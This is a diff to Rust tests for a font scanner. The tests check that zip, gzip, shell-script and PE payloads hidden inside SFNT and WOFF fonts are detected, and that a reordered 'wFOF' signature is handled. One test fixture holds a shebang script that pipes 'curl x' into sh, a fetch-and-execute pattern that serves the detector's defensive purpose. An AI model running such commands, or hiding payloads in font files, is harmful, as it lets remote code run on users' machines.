@@ -535,9 +535,14 @@ fn payload_in_an_interior_gap_is_classified() {
 
 #[test]
 fn archive_and_script_stowaways_are_named() {
+    use std::io::Write;
+
+    let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
+    encoder.write_all(b"gzip stream here").unwrap();
+    let gzip = encoder.finish().unwrap();
     for (payload, want) in [
         (b"PK\x03\x04rest of a zip".as_slice(), "zip"),
-        (b"\x1f\x8b\x08gzip stream here".as_slice(), "gzip"),
+        (gzip.as_slice(), "gzip"),
         (b"#!/bin/sh\ncurl x | sh\n".as_slice(), "shebang"),
     ] {
         let mut font = build_sfnt([0x00, 0x01, 0x00, 0x00], &[(b"head", &[0u8; 54])]);
@@ -790,4 +795,36 @@ fn overlapping_tables_share_one_scan_budget() {
             .iter()
             .any(|p| p.as_str().is_some_and(|p| p.contains("scan budget")))
     );
+}
+
+#[test]
+fn reordered_woff_signature_retains_layout_without_claiming_validity() {
+    let mut bytes = build_woff(&[(b"head", &[0u8; 54]), (b"cmap", &[0u8; 32])], &[], &[]);
+    bytes.get_mut(..4).unwrap().copy_from_slice(b"wFOF");
+    let (values, _) = run(&bytes);
+    assert_eq!(format_of(&values), "none");
+    assert_eq!(
+        values.get("font.valid").and_then(JsonValue::as_bool),
+        Some(false)
+    );
+    assert_eq!(
+        values.get("font.layout_format").and_then(JsonValue::as_str),
+        Some("woff")
+    );
+    assert!(values.get("font.content_kind").is_none());
+}
+
+#[test]
+fn reordered_magic_does_not_whitelist_noise_or_hide_private_payloads() {
+    let mut bytes = noise(2048);
+    bytes.get_mut(..4).unwrap().copy_from_slice(b"wFOF");
+    assert!(run(&bytes).0.get("font.layout_format").is_none());
+    let mut bytes = build_woff(&[(b"head", &[0u8; 54])], &[], &fake_pe(1024));
+    bytes.get_mut(..4).unwrap().copy_from_slice(b"wFOF");
+    let (values, _) = run(&bytes);
+    assert_eq!(
+        values.get("font.layout_format").and_then(JsonValue::as_str),
+        Some("woff")
+    );
+    assert_eq!(stowaway(&values), vec!["pe"]);
 }
